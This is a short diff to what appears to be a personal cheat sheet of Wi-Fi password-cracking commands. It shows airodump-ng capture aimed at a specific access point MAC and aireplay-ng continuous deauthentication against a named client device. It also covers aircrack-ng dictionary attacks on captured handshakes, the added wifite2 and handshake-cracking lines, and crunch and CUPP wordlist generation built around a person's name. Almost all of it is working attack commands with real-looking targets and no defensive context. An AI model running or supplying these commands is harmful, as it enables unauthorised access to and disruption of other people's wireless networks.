@@ -5,6 +5,9 @@ airodump-ng -c6 -w Capture-Pat -d 28:EE:52:99:20:02 wlan0
 aireplay-ng --deauth 0 -a 28:EE:52:99:20:02 -c 14:11:14:4E:B1:64 wlan0
 aircrack-ng Capture-Pat-01.cap -w /usr/share/wordlists/rockyou.txt
 
+sudo wifite => https://github.com/kimocoder/wifite2
+aircrack-ng hs/handshake_siad_BC-62-CE-CB-2E-79_2025-04-10T12-05-42.cap -w password.lst
+
 Brute Force Wordlist: crunch 8 12 -t Imtiaz$$$$$$ -o passwords.txt
 Custom Wordlist: https://github.com/Mebus/cupp.git
 python3 cupp.py -i
